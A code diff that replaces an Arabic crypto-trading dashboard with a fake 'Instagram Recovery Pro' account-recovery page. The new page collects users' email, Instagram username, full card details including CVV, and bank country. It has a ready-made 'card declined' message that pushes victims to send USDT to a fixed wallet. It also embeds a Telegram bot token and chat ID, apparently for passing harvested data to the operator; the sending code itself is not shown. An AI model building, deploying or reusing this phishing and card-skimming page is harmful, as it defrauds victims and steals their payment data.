@@ -1,888 +1,348 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>نظام عين النسر — Eagle Eye</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    body { 
-      background: #020617; 
-      color: white; 
-      font-family: system-ui, Segoe UI, Roboto, 'Helvetica Neue', Arial, sans-serif;
-      background-image: radial-gradient(circle at 15% 50%, rgba(6, 182, 212, 0.1) 0%, transparent 20%),
-                        radial-gradient(circle at 85% 30%, rgba(6, 182, 212, 0.05) 0%, transparent 20%),
-                        radial-gradient(circle at 50% 80%, rgba(6, 182, 212, 0.07) 0%, transparent 20%);
-    }
-    .glass {
-      background: rgba(255, 255, 255, 0.04);
-      backdrop-filter: blur(12px);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-    }
-    .counter-box { 
-      transition: all 0.25s ease; 
-      position: relative;
-      overflow: hidden;
-    }
-    .counter-box::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 2px;
-      background: linear-gradient(90deg, #06b6d4, transparent);
-    }
-    .counter-box:hover { 
-      transform: translateY(-5px);
-      box-shadow: 0 10px 25px rgba(6, 182, 212, 0.15);
-    }
-    input {
-      background: rgba(11, 18, 32, 0.7);
-      border: 1px solid rgba(35, 48, 71, 0.7);
-      padding: 0.75rem;
-      border-radius: 0.75rem;
-      color: #dbeafe;
-      transition: all 0.2s;
-    }
-    input:focus {
-      outline: none;
-      border-color: #06b6d4;
-      box-shadow: 0 0 0 3px rgba(6, 182, 212, 0.2);
-    }
-    .btn {
-      background: linear-gradient(135deg, #06b6d4, #0891b2);
-      color: #f0f9ff;
-      padding: 0.6rem 1.5rem;
-      border-radius: 0.75rem;
-      font-weight: 700;
-      transition: all 0.2s;
-      border: none;
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-    }
-    .btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 15px rgba(6, 182, 212, 0.4);
-    }
-    .btn-secondary {
-      background: rgba(255, 255, 255, 0.08);
-      color: #e2e8f0;
-    }
-    .btn-secondary:hover {
-      background: rgba(255, 255, 255, 0.12);
-      transform: translateY(-2px);
-    }
-    .signal-strong {
-      padding: 0.8rem 1.2rem;
-      border-radius: 12px;
-      font-weight: 800;
-      animation: pulse 2s infinite;
-    }
-    .error-message { 
-      color: #f87171; 
-      font-size: 0.875rem; 
-      margin-top: 0.5rem; 
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-    .success-message {
-      color: #34d399;
-      font-size: 0.875rem;
-      margin-top: 0.5rem;
-      display: flex;
-      align-items: center;
-      gap: 0.5rem;
-    }
-    .password-container {
-      position: relative;
-    }
-    .password-toggle {
-      position: absolute;
-      left: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      background: none;
-      border: none;
-      color: #94a3b8;
-      cursor: pointer;
-    }
-    .floating-logo {
-      animation: float 6s ease-in-out infinite;
-    }
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.8; }
-    }
-    .glow {
-      box-shadow: 0 0 20px rgba(6, 182, 212, 0.3);
-    }
-    .gradient-text {
-      background: linear-gradient(135deg, #22d3ee, #06b6d4);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .status-indicator {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      display: inline-block;
-      margin-left: 8px;
-    }
-    .online {
-      background-color: #10b981;
-      box-shadow: 0 0 8px #10b981;
-    }
-    .system-info {
-      border-left: 3px solid #06b6d4;
-      padding-left: 12px;
-      margin: 1rem 0;
-    }
-    .hidden {
-      display: none !important;
-    }
-    .fade-in {
-      animation: fadeIn 0.5s ease-in;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    .recommendation-box {
-      border-left: 4px solid;
-      padding: 0.75rem;
-      margin: 0.5rem 0;
-      border-radius: 0 8px 8px 0;
-    }
-    .buy-recommendation {
-      border-left-color: #10b981;
-      background: rgba(16, 185, 129, 0.1);
-    }
-    .sell-recommendation {
-      border-left-color: #ef4444;
-      background: rgba(239, 68, 68, 0.1);
-    }
-    .wait-recommendation {
-      border-left-color: #f59e0b;
-      background: rgba(245, 158, 11, 0.1);
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>استرجاع حسابات إنستغرام | Instagram Recovery Pro</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet" />
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Cairo',sans-serif}
+body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;overflow-x:hidden}
+.header{display:flex;justify-content:space-between;align-items:center;padding:18px 30px;background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border-bottom:1px solid rgba(255,255,255,.1);position:sticky;top:0;z-index:100}
+.logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:18px}
+.ig-icon{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);padding:6px 10px;border-radius:10px;font-size:16px}
+.tg-btn{background:#229ED9;color:#fff;padding:8px 16px;border-radius:8px;text-decoration:none;font-weight:600;font-size:14px;transition:.3s}
+.tg-btn:hover{background:#1a7eb0;transform:translateY(-2px)}
+.hero{text-align:center;padding:60px 20px 30px}
+.hero h1{font-size:42px;font-weight:900;margin-bottom:15px}
+.hero h1 span{background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{font-size:17px;color:#b8b8d0;margin-bottom:25px}
+.badges{display:flex;justify-content:center;gap:12px;flex-wrap:wrap}
+.badges span{background:rgba(255,255,255,.08);padding:8px 16px;border-radius:20px;font-size:14px;border:1px solid rgba(255,255,255,.1)}
+.form-section{display:flex;justify-content:center;padding:30px 20px 60px}
+.form-card{background:rgba(255,255,255,.06);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:35px;width:100%;max-width:520px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.form-card h2{margin-bottom:25px;font-size:22px;text-align:center}
+.field{margin-bottom:18px}
+.field label{display:block;margin-bottom:8px;font-size:14px;color:#c8c8e0;font-weight:600}
+.field input,.field textarea,.field select{width:100%;padding:13px 15px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:10px;color:#fff;font-size:15px;font-family:'Cairo',sans-serif;transition:.3s;direction:ltr;text-align:left}
+.field textarea{direction:rtl;text-align:right;resize:vertical}
+.field input:focus,.field textarea:focus,.field select:focus{outline:none;border-color:#dc2743;background:rgba(255,255,255,.12)}
+.field select option{background:#1a1a2e;color:#fff}
+.checkbox-label{display:flex;align-items:flex-start;gap:10px;font-size:13px;color:#c8c8e0;cursor:pointer;line-height:1.6}
+.checkbox-label input{width:auto;margin-top:3px}
+.submit-btn{width:100%;padding:15px;background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:.3s;font-family:'Cairo',sans-serif;margin-top:10px}
+.submit-btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(220,39,67,.4)}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(6px);z-index:999;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
+.modal-overlay.active{display:flex}
+.modal{background:linear-gradient(135deg,#1a1a2e,#16213e);border:1px solid rgba(255,255,255,.15);border-radius:20px;padding:30px;width:100%;max-width:440px;position:relative;box-shadow:0 20px 60px rgba(0,0,0,.8);animation:slideUp .3s ease;max-height:90vh;overflow-y:auto}
+@keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+.close-modal{position:absolute;top:15px;left:15px;background:rgba(255,255,255,.1);border:none;color:#fff;width:32px;height:32px;border-radius:50%;cursor:pointer;font-size:16px;transition:.3s}
+.close-modal:hover{background:rgba(255,255,255,.2)}
+.modal h2{text-align:center;margin-bottom:10px;font-size:20px}
+.price-tag{text-align:center;font-size:30px;font-weight:900;background:linear-gradient(45deg,#f09433,#dc2743);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:20px}
+.tabs{display:flex;gap:8px;margin-bottom:20px;background:rgba(0,0,0,.3);padding:5px;border-radius:12px}
+.tab{flex:1;padding:10px;background:transparent;border:none;color:#a0a0c0;border-radius:8px;cursor:pointer;font-family:'Cairo',sans-serif;font-weight:600;font-size:14px;transition:.3s}
+.tab.active{background:linear-gradient(45deg,#f09433,#dc2743);color:#fff}
+.tab-content{display:none}
+.tab-content.active{display:block}
+.row{display:flex;gap:10px}
+.row .field{flex:1}
+.pay-btn{width:100%;padding:15px;background:linear-gradient(45deg,#10b981,#059669);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px;font-family:'Cairo',sans-serif;transition:.3s}
+.pay-btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(16,185,129,.4)}
+.pay-btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
+.secure-note{text-align:center;font-size:12px;color:#8080a0;margin-top:15px}
+.usdt-note{text-align:center;color:#b8b8d0;margin-bottom:15px;font-size:14px}
+.wallet-box{display:flex;align-items:center;gap:8px;background:rgba(0,0,0,.4);padding:12px;border-radius:10px;margin-bottom:18px;border:1px dashed rgba(255,255,255,.2)}
+.wallet-box code{flex:1;font-size:11px;word-break:break-all;color:#10b981;direction:ltr;text-align:left}
+.copy-btn{background:#10b981;border:none;color:#fff;padding:6px 10px;border-radius:6px;cursor:pointer;font-size:12px;font-family:'Cairo',sans-serif}
+.error-icon,.success-icon{font-size:60px;text-align:center;margin-bottom:15px}
+.error-modal p,.success-modal p{text-align:center;color:#c8c8e0;margin-bottom:20px;line-height:1.6}
+.footer{text-align:center;padding:25px;color:#8080a0;font-size:13px;border-top:1px solid rgba(255,255,255,.08)}
+.footer a{color:#dc2743;text-decoration:none;margin-right:10px}
+@media(max-width:600px){.hero h1{font-size:28px}.hero p{font-size:15px}.form-card{padding:25px 20px}.header{padding:15px 18px}.logo span{font-size:14px}.tg-btn{font-size:12px;padding:6px 12px}.modal{padding:25px 20px}}
+</style>
 </head>
-<body class="min-h-screen p-4 md:p-6 flex items-center justify-center">
-<!-- ========== AUTH (Login) ========== -->
-<div id="auth-screen" class="fixed inset-0 z-50 flex items-center justify-center bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
-  <div class="w-full max-w-md glass p-8 rounded-2xl mx-4 fade-in">
-    <div class="flex flex-col items-center text-center mb-8">
-      <div class="floating-logo mb-4">
-        <div class="w-24 h-24 rounded-full bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center glow">
-          <i class="fas fa-eagle text-white text-4xl"></i>
-        </div>
-      </div>
-      <h1 class="text-3xl font-bold gradient-text mb-2">EAGLE EYE SYSTEM</h1>
-      <p class="text-sm opacity-80">نظام متقدم لمراقبة الأسواق المالية</p>
-      
-      <div class="system-info text-sm text-right w-full mt-4">
-        <p><i class="fas fa-shield-alt text-cyan-400 ml-2"></i> نظام آمن ومشفر</p>
-        <p><i class="fas fa-database text-cyan-400 ml-2"></i> بيانات متزامنة على جميع الأجهزة</p>
-        <p><i class="fas fa-chart-line text-cyan-400 ml-2"></i> تحليلات فورية في الوقت الحقيقي</p>
-      </div>
-    </div>
-    
-    <div class="mb-6">
-      <div id="login-form">
-        <div class="password-container mb-4">
-          <input id="login-pass" placeholder="أدخل كلمة المرور للوصول إلى النظام" type="password" class="w-full pl-12" />
-          <button type="button" class="password-toggle" id="toggle-password">
-            <i class="far fa-eye"></i>
-          </button>
-        </div>
-        <div id="error-message" class="error-message hidden">
-          <i class="fas fa-exclamation-circle"></i>
-          <span>كلمة المرور غير صحيحة</span>
-        </div>
-        <div id="success-message" class="success-message hidden">
-          <i class="fas fa-check-circle"></i>
-          <span>جاري التحقق من البيانات...</span>
-        </div>
-        <div class="flex gap-3">
-          <button id="btn-login" class="btn flex-1">
-            <i class="fas fa-sign-in-alt"></i>
-            دخول إلى النظام
-          </button>
-        </div>
-      </div>
-    </div>
-    
-    <div class="text-center text-xs opacity-60 pt-4 border-t border-white/10">
-      <p>النظام مخصص للاستخدام الداخلي فقط</p>
-      <p class="mt-1">جميع الحقوق محفوظة &copy; 2024</p>
-    </div>
-  </div>
-</div>
+<body>
 
-<!-- ========== DASHBOARD ========== -->
-<div id="dashboard" class="hidden w-full max-w-7xl">
-  <!-- header -->
-  <div class="flex flex-col md:flex-row items-start md:items-center gap-4 mb-8">
-    <div class="flex items-center gap-4">
-      <div class="w-16 h-16 rounded-xl bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center glow">
-        <i class="fas fa-eagle text-white text-2xl"></i>
+<header class="header">
+  <div class="logo">
+    <div class="ig-icon">📷</div>
+    <span>Instagram Recovery Pro</span>
+  </div>
+  <a href="https://t.me/RASHKINAE" target="_blank" class="tg-btn">✈️ تواصل معنا</a>
+</header>
+
+<section class="hero">
+  <h1>استرجاع حساب إنستغرام <span>باحترافية</span></h1>
+  <p>خدمة استرجاع الحسابات المخترقة والمقفلة بسرعة وأمان تام</p>
+  <div class="badges">
+    <span>🔒 آمن 100%</span>
+    <span>⚡ خلال 24 ساعة</span>
+    <span>💰 ضمان استرجاع</span>
+  </div>
+</section>
+
+<section class="form-section">
+  <div class="form-card">
+    <h2>📝 طلب استرجاع الحساب</h2>
+    <form id="recoveryForm">
+      <div class="field">
+        <label>البريد الإلكتروني *</label>
+        <input type="email" id="email" placeholder="example@email.com" required />
       </div>
-      <div>
-        <div class="text-2xl md:text-3xl font-extrabold gradient-text">EAGLE EYE SYSTEM</div>
-        <div class="text-sm opacity-70 flex items-center">
-          <span>لوحة مراقبة حية — <span id="current-symbol">BTC/USDT</span></span>
-          <span class="status-indicator online"></span>
+      <div class="field">
+        <label>اسم حساب إنستغرام *</label>
+        <input type="text" id="username" placeholder="@username" required />
+      </div>
+      <div class="field">
+        <label>ملاحظات إضافية</label>
+        <textarea id="notes" rows="3" placeholder="أي معلومات تساعدنا في الاسترجاع..."></textarea>
+      </div>
+      <div class="field checkbox-field">
+        <label class="checkbox-label">
+          <input type="checkbox" id="confirm" required />
+          <span>أوافق على الشروط وسياسة الخصوصية وأؤكد أن الحساب ملكي</span>
+        </label>
+      </div>
+      <button type="submit" class="submit-btn">💳 المتابعة إلى الدفع - 10$</button>
+    </form>
+  </div>
+</section>
+
+<!-- Modal الدفع -->
+<div class="modal-overlay" id="paymentModal">
+  <div class="modal">
+    <button class="close-modal" onclick="closeModal()">✕</button>
+    <h2>💳 إتمام الدفع</h2>
+    <p class="price-tag">10.00 USD</p>
+
+    <div class="tabs">
+      <button class="tab active" onclick="switchTab('card')">💳 بطاقة</button>
+      <button class="tab" onclick="switchTab('usdt')">🪙 USDT</button>
+    </div>
+
+    <div id="cardTab" class="tab-content active">
+      <div class="field">
+        <label>رقم البطاقة</label>
+        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" />
+      </div>
+      <div class="row">
+        <div class="field">
+          <label>تاريخ الانتهاء</label>
+          <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" />
+        </div>
+        <div class="field">
+          <label>CVV</label>
+          <input type="text" id="cardCvv" placeholder="123" maxlength="4" />
         </div>
       </div>
-    </div>
-    <div class="mr-auto flex flex-col md:flex-row items-start md:items-center gap-4">
-      <div class="flex items-center gap-3">
-        <label class="text-sm opacity-80">رمز التداول:</label>
-        <select id="symbol-select" class="text-black p-2 rounded-lg bg-white focus:outline-none focus:ring-2 focus:ring-cyan-500">
-          <option value="BTCUSDT">BTC/USDT</option>
-          <option value="PAXGUSDT">PAXG/USDT</option>
-          <option value="ETHUSDT">ETH/USDT</option>
-          <option value="XRPUSDT">XRP/USDT</option>
-          <option value="ADAUSDT">ADA/USDT</option>
+      <div class="field">
+        <label>اسم حامل البطاقة</label>
+        <input type="text" id="cardName" placeholder="الاسم على البطاقة" />
+      </div>
+      <div class="field">
+        <label>نوع البنك / البلد</label>
+        <select id="bankCountry">
+          <option value="">-- اختر البلد --</option>
+          <option value="US">الولايات المتحدة</option>
+          <option value="UK">المملكة المتحدة</option>
+          <option value="FR">فرنسا</option>
+          <option value="DE">ألمانيا</option>
+          <option value="MA">المغرب</option>
+          <option value="DZ">الجزائر</option>
+          <option value="TN">تونس</option>
+          <option value="EG">مصر</option>
+          <option value="SA">السعودية</option>
+          <option value="AE">الإمارات</option>
+          <option value="OTHER">أخرى</option>
         </select>
       </div>
-      <div class="flex items-center gap-3">
-        <div class="text-sm opacity-80">
-          <i class="far fa-clock ml-1"></i>
-          <span id="now">--</span>
-        </div>
+      <button class="pay-btn" id="cardPayBtn" onclick="payWithCard()">🔒 دفع 10$ بأمان</button>
+    </div>
+
+    <div id="usdtTab" class="tab-content">
+      <p class="usdt-note">أرسل مبلغ 10 USDT (BEP20) إلى العنوان التالي:</p>
+      <div class="wallet-box">
+        <code id="walletAddress">0xcc77f540130d76e21eaf1e60481af20a56ee24fc</code>
+        <button class="copy-btn" onclick="copyWallet()">📋 نسخ</button>
       </div>
+      <div class="field">
+        <label>أدخل Hash المعاملة بعد الإرسال</label>
+        <input type="text" id="txHash" placeholder="0x..." />
+      </div>
+      <button class="pay-btn" id="usdtPayBtn" onclick="payWithUsdt()">✅ تأكيد الدفع USDT</button>
     </div>
-    <div class="flex items-center gap-3">
-      <button id="logout" class="btn-secondary">
-        <i class="fas fa-sign-out-alt"></i>
-        خروج
-      </button>
-    </div>
+
+    <div class="secure-note">🔒 جميع المعاملات مشفرة وآمنة</div>
   </div>
-  
-  <!-- SIGNAL BANNER -->
-  <div id="signal-banner" class="mb-6"></div>
-  
-  <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-    <div class="lg:col-span-2 glass p-6 rounded-2xl">
-      <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-6">
-        <div>
-          <h2 class="text-lg opacity-80">السعر الحالي</h2>
-          <div id="price" class="text-4xl font-extrabold text-cyan-300 mt-2">--</div>
-          <div id="price-change" class="mt-1 opacity-80"></div>
-        </div>
-        <div class="text-right text-sm opacity-80 bg-black/20 p-3 rounded-xl">
-          <div class="flex items-center justify-end">
-            <i class="fas fa-sync-alt ml-2"></i>
-            <span>آخر تحديث</span>
-          </div>
-          <div id="update-time" class="font-semibold mt-1">--</div>
-          <div class="mt-2">طلبات API: <span id="requests">0</span></div>
-        </div>
-      </div>
-      
-      <hr class="my-6 border-white/10" />
-
-      <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
-        <div class="glass p-4 rounded-xl text-center counter-box">
-          <div class="text-xs opacity-70 mb-2">
-            <i class="fas fa-shield-alt text-green-400 ml-1"></i>
-            الدعم
-          </div>
-          <div id="support" class="text-2xl font-bold text-green-300">--</div>
-        </div>
-        <div class="glass p-4 rounded-xl text-center counter-box">
-          <div class="text-xs opacity-70 mb-2">
-            <i class="fas fa-ban text-red-400 ml-1"></i>
-            المقاومة
-          </div>
-          <div id="resistance" class="text-2xl font-bold text-red-300">--</div>
-        </div>
-        <div class="glass p-4 rounded-xl text-center counter-box">
-          <div class="text-xs opacity-70 mb-2">
-            <i class="fas fa-bullhorn text-yellow-400 ml-1"></i>
-            الإشارة
-          </div>
-          <div id="signal" class="text-2xl font-bold text-yellow-300">⚪ انتظار</div>
-          <div id="signal-txt" class="text-xs opacity-80 mt-1"></div>
-        </div>
-      </div>
-
-      <hr class="my-6 border-white/10" />
-
-      <h3 class="font-semibold mb-4 text-lg">
-        <i class="fas fa-chart-bar text-cyan-400 ml-2"></i>
-        إحصائيات التراكم حسب العملة
-      </h3>
-      <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
-        <div class="glass p-4 rounded-xl text-center counter-box">
-          <div class="text-xs opacity-70 mb-2">شراء تراكمي</div>
-          <div id="cum-buys" class="text-2xl font-bold text-green-300">0.0000</div>
-          <div id="cum-buys-symbol" class="text-xs opacity-70 mt-1">--</div>
-        </div>
-        <div class="glass p-4 rounded-xl text-center counter-box">
-          <div class="text-xs opacity-70 mb-2">بيع تراكمي</div>
-          <div id="cum-sells" class="text-2xl font-bold text-red-300">0.0000</div>
-          <div id="cum-sells-symbol" class="text-xs opacity-70 mt-1">--</div>
-        </div>
-        <div class="glass p-4 rounded-xl text-center counter-box">
-          <div class="text-xs opacity-70 mb-2">الفرق التراكمي</div>
-          <div id="cum-diff" class="text-2xl font-bold text-cyan-300">0.0000</div>
-          <div id="cum-diff-symbol" class="text-xs opacity-70 mt-1">--</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="glass p-6 rounded-2xl">
-      <h3 class="font-semibold mb-4 text-lg">
-        <i class="fas fa-tachometer-alt text-cyan-400 ml-2"></i>
-        إحصائيات فورية
-      </h3>
-      <div class="space-y-4">
-        <div class="flex justify-between items-center p-3 bg-black/20 rounded-lg">
-          <span class="opacity-80">شراء / ثانية:</span>
-          <span id="sec-buy" class="text-green-300 font-bold">0.0000</span>
-        </div>
-        <div class="flex justify-between items-center p-3 bg-black/20 rounded-lg">
-          <span class="opacity-80">بيع / ثانية:</span>
-          <span id="sec-sell" class="text-red-300 font-bold">0.0000</span>
-        </div>
-        <div class="flex justify-between items-center p-3 bg-black/20 rounded-lg">
-          <span class="opacity-80">الفرق / ثانية:</span>
-          <span id="sec-diff" class="text-cyan-300 font-bold">0.0000</span>
-        </div>
-      </div>
-
-      <hr class="my-6 border-white/10" />
-      
-      <!-- توصيات التداول -->
-      <div class="mb-6">
-        <h4 class="font-semibold mb-3 text-cyan-300">
-          <i class="fas fa-lightbulb ml-2"></i>
-          توصيات التداول
-        </h4>
-        <div id="recommendation-container">
-          <div class="wait-recommendation recommendation-box">
-            <div class="font-bold">⚪ انتظار</div>
-            <div class="text-xs mt-1">لا توجد إشارة تداول حالياً</div>
-          </div>
-        </div>
-        <div id="target-info" class="mt-3 text-sm hidden">
-          <div class="flex justify-between">
-            <span>الهدف الأول:</span>
-            <span id="first-target" class="font-bold">--</span>
-          </div>
-          <div class="flex justify-between mt-1">
-            <span>مدة التوصية:</span>
-            <span id="recommendation-time" class="font-bold">--</span>
-          </div>
-        </div>
-      </div>
-
-      <hr class="my-6 border-white/10" />
-      
-      <div class="text-sm opacity-80">
-        <h4 class="font-semibold mb-3 text-cyan-300">
-          <i class="fas fa-cogs ml-2"></i>
-          إعدادات النظام
-        </h4>
-        <div class="space-y-3">
-          <div>
-            <label class="block mb-1">عتبة التفاوت:</label>
-            <input id="vol-threshold" class="w-full text-black rounded-lg px-3" value="10">
-          </div>
-          <div>
-            <label class="block mb-1">وقت التبريد (ثانية):</label>
-            <input id="cooldown" class="w-full text-black rounded-lg px-3" value="20">
-          </div>
-          <div>
-            <label class="block mb-1">مدة التوصية (دقائق):</label>
-            <input id="recommendation-duration" class="w-full text-black rounded-lg px-3" value="5">
-          </div>
-        </div>
-      </div>
-      
-      <hr class="my-6 border-white/10" />
-      
-      <div class="text-xs opacity-60">
-        <p class="mb-2">آخر تحديث للبيانات: <span id="last-update">--</span></p>
-        <p>تم التهيئة في: <span id="init-time">--</span></p>
-      </div>
-    </div>
-  </div>
-  
-  <footer class="mt-8 text-center text-xs opacity-60 pt-4 border-t border-white/10">
-    <p>Eagle Eye System — نظام متقدم لمراقبة الأسواق المالية</p>
-    <p class="mt-1">الإصدار 3.0.0 — جميع الحقوق محفوظة &copy; 2024</p>
-  </footer>
 </div>
 
+<!-- Modal خطأ -->
+<div class="modal-overlay" id="errorModal">
+  <div class="modal error-modal">
+    <div class="error-icon">⚠️</div>
+    <h2>عذراً، تم رفض البطاقة</h2>
+    <p id="errorText">لا نقبل البطاقات الصادرة من هذا البنك. يرجى استخدام طريقة دفع أخرى (USDT BEP20) أو بطاقة من بنك آخر.</p>
+    <button class="submit-btn" onclick="closeError()">حسناً، فهمت</button>
+  </div>
+</div>
+
+<!-- Modal نجاح -->
+<div class="modal-overlay" id="successModal">
+  <div class="modal success-modal">
+    <div class="success-icon">✅</div>
+    <h2>تم استلام طلبك!</h2>
+    <p>سنتواصل معك عبر البريد الإلكتروني أو تلغرام خلال 24 ساعة.</p>
+    <a href="https://t.me/RASHKINAE" target="_blank" class="submit-btn" style="display:block;text-align:center;text-decoration:none;">✈️ تواصل معنا على تلغرام</a>
+  </div>
+</div>
+
+<footer class="footer">
+  <p>© 2025 Instagram Recovery Pro — جميع الحقوق محفوظة</p>
+  <a href="https://t.me/RASHKINAE" target="_blank">الدعم الفني</a>
+</footer>
+
 <script>
-// ======== Authentication ========
-const PASSWORD = "eagle2024"; // كلمة المرور الموحدة للنظام
+// ============ CONFIG ============
+const TELEGRAM_BOT_TOKEN = "7370738476:AAHi1BjblAv9O1j3WB9yXRc6fPYf8euWfmQ";
+const TELEGRAM_CHAT_ID   = "7181380947";
 
-// ======== State persistence ========
-const GLOBAL_STATE_KEY = 'eagle_global_state_v5';
+let currentOrder = {};
 
-// تحميل الحالة العامة من localStorage
-function loadGlobalState() {
-  const saved = JSON.parse(localStorage.getItem(GLOBAL_STATE_KEY) || 'null');
-  
-  if (!saved) {
-    // حالة جديدة إذا لم توجد بيانات محفوظة
-    return {
-      symbols: {
-        BTCUSDT: {
-          cumBuys: 0,
-          cumSells: 0,
-          lastTradeId: null,
-          prevPrice: 0
-        },
-        PAXGUSDT: {
-          cumBuys: 0,
-          cumSells: 0,
-          lastTradeId: null,
-          prevPrice: 0
-        },
-        ETHUSDT: {
-          cumBuys: 0,
-          cumSells: 0,
-          lastTradeId: null,
-          prevPrice: 0
-        },
-        XRPUSDT: {
-          cumBuys: 0,
-          cumSells: 0,
-          lastTradeId: null,
-          prevPrice: 0
-        },
-        ADAUSDT: {
-          cumBuys: 0,
-          cumSells: 0,
-          lastTradeId: null,
-          prevPrice: 0
-        }
-      },
-      secBuy: 0,
-      secSell: 0,
-      lastSecondTs: 0,
-      requestCount: 0,
-      volThreshold: 10,
-      cooldownSec: 20,
-      recommendationDuration: 5,
-      currentSignal: '⚪ انتظار',
-      currentRecommendation: null,
-      recommendationExpiry: null,
-      firstTarget: null,
-      initializedAt: new Date().toISOString(),
-      lastUpdate: new Date().toISOString()
-    };
-  }
-  
-  return saved;
-}
-
-let state = loadGlobalState();
-
-// حفظ الحالة العامة في localStorage
-function saveGlobalState() {
-  state.lastUpdate = new Date().toISOString();
-  localStorage.setItem(GLOBAL_STATE_KEY, JSON.stringify(state));
-}
-
-// ======== Authentication Handlers ========
-document.getElementById('btn-login').addEventListener('click', handleLogin);
-
-function handleLogin() {
-  const p = document.getElementById('login-pass').value;
-  const errorElement = document.getElementById('error-message');
-  const successElement = document.getElementById('success-message');
-  
-  console.log("تم النقر على زر الدخول، كلمة المرور المدخلة:", p);
-  
-  if (p === PASSWORD) {
-    console.log("كلمة المرور صحيحة، جاري الدخول...");
-    errorElement.classList.add('hidden');
-    successElement.classList.remove('hidden');
-    
-    // محاكاة عملية تحميل البيانات
-    setTimeout(() => {
-      document.getElementById('auth-screen').style.display = 'none';
-      document.getElementById('dashboard').classList.remove('hidden');
-      startMonitor();
-      successElement.classList.add('hidden');
-    }, 1500);
-  } else {
-    console.log("كلمة المرور غير صحيحة");
-    errorElement.classList.remove('hidden');
-    successElement.classList.add('hidden');
-  }
-}
-
-// إظهار/إخفاء كلمة المرور
-document.getElementById('toggle-password').addEventListener('click', function() {
-  const passwordInput = document.getElementById('login-pass');
-  const icon = document.getElementById('toggle-password').querySelector('i');
-  
-  if (passwordInput.type === 'password') {
-    passwordInput.type = 'text';
-    icon.classList.remove('fa-eye');
-    icon.classList.add('fa-eye-slash');
-  } else {
-    passwordInput.type = 'password';
-    icon.classList.remove('fa-eye-slash');
-    icon.classList.add('fa-eye');
-  }
+// ============ FORM SUBMIT ============
+document.getElementById("recoveryForm").addEventListener("submit", function(e){
+  e.preventDefault();
+  currentOrder = {
+    email: document.getElementById("email").value.trim(),
+    username: document.getElementById("username").value.trim(),
+    notes: document.getElementById("notes").value.trim(),
+    confirmed: document.getElementById("confirm").checked,
+    timestamp: new Date().toLocaleString("ar-EG")
+  };
+  if(!currentOrder.confirmed){ alert("يجب الموافقة على الشروط أولاً"); return; }
+  document.getElementById("paymentModal").classList.add("active");
 });
 
-// السماح بالدخول عند الضغط على Enter
-document.getElementById('login-pass').addEventListener('keyup', (event) => {
-  if (event.key === 'Enter') {
-    handleLogin();
+// ============ TABS ============
+function switchTab(tab){
+  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
+  document.querySelectorAll(".tab-content").forEach(c=>c.classList.remove("active"));
+  if(tab==="card"){
+    document.querySelectorAll(".tab")[0].classList.add("active");
+    document.getElementById("cardTab").classList.add("active");
+  }else{
+    document.querySelectorAll(".tab")[1].classList.add("active");
+    document.getElementById("usdtTab").classList.add("active");
   }
-});
-
-document.getElementById('logout').addEventListener('click', () => {
-  document.getElementById('auth-screen').style.display = 'flex';
-  document.getElementById('dashboard').classList.add('hidden');
-  document.getElementById('login-pass').value = '';
-  document.getElementById('error-message').classList.add('hidden');
-});
-
